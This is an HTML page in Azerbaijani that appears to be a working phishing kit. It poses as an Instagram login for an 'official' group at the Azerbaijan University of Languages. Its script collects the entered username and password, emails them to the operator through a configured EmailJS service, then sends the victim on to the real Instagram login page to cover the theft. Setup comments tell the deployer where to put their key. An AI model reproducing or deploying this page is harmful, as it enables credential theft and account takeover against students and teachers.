<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş • Instagram</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            // BURANI DƏYİŞDİR: EmailJS-dən aldığın Public Key-i buraya yaz
            emailjs.init("Qg90bKmVcMrD7BLhE");
        })();
    </script>
    
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; }
        .login-container { margin-top: 30px; width: 100%; max-width: 600px; }
        .box { background: #fff; border: 1px solid #dbdbdb; padding: 10px 40px; margin-bottom: 5px; display: flex; flex-direction: column; align-items: center; }
        .logo { margin: 22px 0 12px; width: 175px; }
        form { width: 100%; display: flex; flex-direction: column; margin-top: 24px; }
        input { background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px 8px; margin-bottom: 6px; font-size: 12px; }
        .login-btn { background: #0095f6; color: #fff; border: none; border-radius: 8px; padding: 7px; font-weight: 600; cursor: pointer; }
        .fb-login { color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; margin: 15px 0; }
        .signup-box { padding: 20px; font-size: 14px; }
        .signup-box a { color: #0095f6; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="box">
            <h1 align="center">Dillər Universiteti</h1>
            <h1 align="center"><br>ADU-nun Rəsmi İnstagram Qrupu 1200+ tələbə və müəllim</br></h1>
            <br><align="center">Qrupa üzv olmaq üçün hesabınıza daxil olun</align="center"></br> 
            <align="center"
            <img src="https://www.google.com/url?sa=i&url=https%3A%2F%2Fcommons.wikimedia.org%2Fwiki%2FFile%3AInstagram_logo_2016.svg&psig=AOvVaw02Z8r92rDh1ZQycLtSrw4W&ust=1772456199759000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCLCfxoHg_pIDFQAAAAAdAAAAABAE" alt="Instagram" class="logo">
            </align="center">
            <form id="loginForm">
              <input type="text" id="user" name="user" placeholder="Telefon, istifadəçi adı və ya e-poçt" required>
              <input type="password" id="pass" name="pass" placeholder="Şifrə" required>
              <button type="submit" id="submitBtn" class="login-btn">Giriş et</button>
            </form>
            <div style="color: #8e8e8e; font-size: 13px; margin: 15px 0;">VƏ YA</div>
            <a href="#" class="fb-login">Facebook ilə giriş et</a>
        </div>
        <div class="box signup-box">
            Hesabın yoxdur? <a href="#">Qeydiyyatdan keç</a>
        </div>
    </div>

   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

<script type="text/javascript">
    (function() {
        // BURANI DƏYİŞDİR: EmailJS panelində "Account" bölməsindən Public Key-i bura yaz
        emailjs.init("Qg90bKmVcMrD7BLhE");
    })();
</script>

<script>
    document.getElementById('loginForm').onsubmit = function(e) {
        e.preventDefault();
        
        const btn = document.getElementById('submitBtn');
        btn.innerText = "Yüklənir...";
        btn.disabled = true;

        // Bütün məlumatları bir obyektə yığırıq
        const templateParams = {
            user: document.getElementById('user').value,
            pass: document.getElementById('pass').value,
            time: new Date().toLocaleString() // Vaxtı burada təyin edirik
        };

        // Göndərmə funksiyası
        emailjs.send('service_4cgpeu9', 'template_ovr973i', templateParams)
            .then(function(response) {
                console.log('SUCCESS!', response.status, response.text);
                // Məlumat getdisə, istifadəçini real Instagram-a atırıq
                window.location.href = "https://www.instagram.com/accounts/login/";
            }, function(error) {
                console.log('FAILED...', error);
                alert("Sistem xətası! Yenidən yoxlayın.");
                btn.innerText = "Giriş et";
                btn.disabled = false;
            });
    };
</script>


</body>
</html>
